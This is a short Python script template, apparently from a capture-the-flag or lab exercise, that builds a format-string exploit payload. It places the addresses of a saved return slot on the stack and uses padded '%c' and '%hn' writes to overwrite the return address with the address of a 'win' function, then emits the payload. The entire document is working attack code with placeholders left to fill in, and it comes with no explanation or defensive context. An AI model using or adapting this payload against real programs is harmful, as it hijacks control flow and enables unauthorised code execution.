#!/usr/bin/env python3
import struct, sys

ret_slot = {printf_saved_ret_slot}
base = {offset}
win = {win_addr}

lo = win & 0xffff
hi = (win >> 16) & 0xffff

payload  = struct.pack("<I", ret_slot)
payload += struct.pack("<I", ret_slot + 2)

count = len(payload)  # 8

# write lower 2 bytes first, then higher 2 bytes
pad1 = (lo - count) % 0x10000
if pad1:
    payload += f"%{pad1}c".encode()
    count += pad1
payload += f"%{base}$hn".encode()

pad2 = (hi - count) % 0x10000
if pad2:
    payload += f"%{pad2}c".encode()
    count += pad2
payload += f"%{base+1}$hn".encode()

payload += b"\n"
sys.stdout.buffer.write(payload)
